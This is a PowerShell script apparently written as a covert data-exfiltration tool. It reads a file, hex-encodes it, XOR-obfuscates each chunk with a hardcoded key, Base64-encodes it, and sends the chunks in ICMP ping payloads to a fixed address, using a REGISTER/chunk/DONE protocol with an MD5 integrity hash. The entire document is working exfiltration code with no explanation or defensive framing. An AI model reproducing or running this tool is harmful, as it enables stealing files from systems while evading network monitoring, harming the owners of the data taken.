function Send-ICMPPacket {
    param ([string] $data)
    $data = Xor $data;
    $data = Base64 $data;
    $IPAddress = '192.168.0.24'
    
    $ICMPClient = New-Object System.Net.NetworkInformation.Ping
    $PingOptions = New-Object System.Net.NetworkInformation.PingOptions
    $PingOptions.DontFragment = $True

    $sendbytes = ([text.encoding]::ASCII).GetBytes($data)
    $ICMPClient.Send($IPAddress,60 * 1000, $sendbytes, $PingOptions) | Out-Null
    Start-Sleep -s 1;
};

function ICMP-exfil
{
    param ([string] $file)
    $bytes = [System.IO.File]::ReadAllBytes($file)
    $md5 = New-Object -TypeName System.Security.Cryptography.MD5CryptoServiceProvider
    $hash = [System.BitConverter]::ToString($md5.ComputeHash($bytes))
    $hash = $hash -replace '-','';
    $filename = Split-Path $file -leaf
    $data = [System.IO.File]::ReadAllBytes($file);
    $string = [System.BitConverter]::ToString($data);
    $string = $string -replace '-','';
    $len = $string.Length;
    #$split = Get-Random -minimum 1 -maximum 250;
    $split = 1000
    $id = 0
    $repeat=[Math]::Ceiling($len/$split);
    $remainder=$len%$split;
    $jobid = [System.Guid]::NewGuid().toString().Substring(0, 7)
    $data = $jobid + '|!|' + $filename + '|!|REGISTER|!|' + $hash 
    $q = Send-ICMPPacket $data
    for($i=0; $i-lt($repeat-1); $i++){
        $str = $string.Substring($i * $Split, $Split);
        $data = $jobid + '|!|' + $i + '|!|' + $str
        $q = Send-ICMPPacket $data
    };
    if($remainder){
        $str = $string.Substring($len-$remainder);
        $i = $i +1
        $data = $jobid + '|!|' + $i + '|!|' + $str
        $q = Send-ICMPPacket $data
    };
    
    $i = $i + 1
    $data = $jobid + '|!|' + $i + '|!|DONE'
    $q = Send-ICMPPacket $data
};

function Base64 {
    param ([string] $data)
    $Bytes = [System.Text.Encoding]::ASCII.GetBytes($data)
    return [Convert]::ToBase64String($Bytes)    
}

function Xor {
    param ([string] $data)  
    $enc = [system.Text.Encoding]::UTF8
    $bytes = $enc.GetBytes($data)
    $key = "THISISACRAZYKEY"
    for($i=0; $i -lt $bytes.count ; $i++)
    {
        $bytes[$i] = $bytes[$i] -bxor $key[$i%$key.Length]
    }
    return [System.Text.Encoding]::ASCII.GetString($bytes)
};

function Convert-ToCHexString 
{
    param ([String] $str) 
    $ans = ''
    [System.Text.Encoding]::ASCII.GetBytes($str) | % { $ans += "{0:X2}" -f $_ }
    return $ans;
};